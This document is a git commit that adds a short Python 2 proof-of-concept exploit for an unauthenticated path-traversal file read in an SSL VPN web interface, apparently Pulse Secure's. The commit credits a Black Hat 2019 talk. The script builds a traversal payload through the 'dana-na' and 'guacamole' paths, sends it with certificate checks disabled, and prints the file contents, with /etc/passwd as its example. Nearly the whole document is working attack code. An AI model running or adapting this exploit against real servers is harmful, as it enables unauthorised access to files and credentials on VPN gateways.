18e3ea897f944628ee532d000ac54b041bff7e4a
Jarkko Vesiluoma <jvesiluoma@gmail.com>
2019-08-15 17:05:06 +0300

    Add files via upload
    Pre-Auth RCE POC (great job by Orange: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf ).

---
+++ preauth_rce_lfi_poc.py
@@ -0,0 +1,30 @@
+import sys
+import socket
+import urlparse
+import requests
+
+try:
+  url = sys.argv[1]
+  file = sys.argv[2]
+  payload = "dana-na/../dana/html5acc/guacamole/../../../../../.." + file + "?/dana/html5acc/guacamole/"	
+except Exception,e:
+  print "[ ] No input params?"
+  print "[ ] Usage: python poc.py <URL> <FILE>"
+  print "[ ]"
+  print "[ ] Example: python poc.py https://vpn.example.com/ /etc/passwd"
+  exit(0)
+
+print "[*] Fetchin " + file + " from " + url
+print "[*] URL: " + url + payload
+try:
+  url = url + payload
+  headers = {"Connection": "close"}
+  response = requests.get(url, headers=headers, verify=False)
+except Exception,e:
+  print "[*] Error (" + str(e) + ")"
+  exit(0)
+print "[*] Success!!"
+print "[*] Response:"
+print response.text
+
+
